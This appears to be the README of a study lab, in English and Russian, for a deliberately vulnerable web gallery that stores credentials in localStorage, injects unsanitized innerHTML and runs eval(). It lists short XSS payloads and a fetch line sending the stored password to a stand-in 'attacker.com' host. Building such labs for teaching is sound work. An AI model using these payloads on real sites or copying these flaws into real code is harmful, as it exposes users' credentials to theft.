# study_labs

# First lab
# EN
App idea - public web galery. Primitive in essense and functionality. Especially made in way for easiest exploitation of said vulnarabilities

1.	Inappropriate creds storage via localstorage
2.	XSS via innerHTML unsanitized injection
3.	Unprotected eval()


Explotation:
1.	<img src=x onerror="alert(localStorage.getItem('password'))" '>
2.	<img src=x onerror=alert(1) '>
3.	alert("blabla")


Any of exploits can be extracted to remote “attacker” host via concatenation of expression evaluation to malicious address:
fetch('https://attacker.com/steal?p=' + localStorage.getItem('password'));


1.	Appeared in late 1990s
Then was mitigated in mid 2000s to 2010s
And returned in 2020s up to current year – thankfully to AI
2.	Appeared in early 2010s
Then been globally mitigated in 2010s
And returned again in same 2020s up to current year by same problem
3.	Appeared in 2000s
Was mitigated in 2000s – 2010s
And again returned in last several years

# RU
Идея приложения - общественная веб галерея. Примитивна по функционалу и сути. Специально составлена для простейшей эксплуатации перечисленных уязвимостей


1. Недобросовестное хранение учетных данных через localstorage
2. XSS через вставку элементов в innerHTML без обработки
3. Незащищенный eval()


Использование:
1.	<img src=x onerror="alert(localStorage.getItem('password'))" '>
2.	<img src=x onerror=alert(1) '>
3.	alert("blabla")


Любая из уязвимостей может быть использована вместе с извлечением на хост атакующего через конкатенацию вычисляемого выражения к адресу атакующего:
fetch('https://attacker.com/steal?p=' + localStorage.getItem('password'));

1. Появилось в поздних 1990-ых
Затем было побеждено с середины 2000-ых до 2010-ых
И вернулось в 2020-ых и до те текущего года - благодаря нейросетям
2. Появилось в ранних 2010-ых
Затем глобально побеждено в 2010-ых
И снова вернулось в тех же 2020-ых до текущего года по той же проблеме
3. Появилось в 2000-ых
Было побеждено в 2000-ых до 2010-ых
И снова вернулось в последние несколько лет
